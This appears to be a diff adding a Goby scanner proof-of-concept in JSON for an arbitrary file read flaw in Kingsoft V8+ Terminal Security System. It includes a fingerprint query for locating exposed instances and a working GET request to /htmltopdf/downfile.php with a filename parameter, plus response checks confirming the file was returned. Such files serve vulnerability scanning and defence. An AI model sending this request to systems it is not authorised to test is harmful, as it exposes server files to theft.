@@ -1,0 +1,57 @@
+{
+      "Name": "Kingsoft V8+ Terminal Security System Fileread",
+      "Level": "1",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "app=\"kingsoft-V8+-Terminal-security-system\"",
+      "Description": "Kingsoft V8+ Terminal Security System",
+      "Product": "Kingsoft V8+",
+      "Homepage": "https://www.ejinshan.net/",
+      "Author": "",
+      "Impact": "There is an arbitrary file reading vulnerability in Jinshan V8 terminal security system, through which attackers can download arbitrary files from the server.",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/htmltopdf/downfile.php?filename=downfile.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "$filename",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
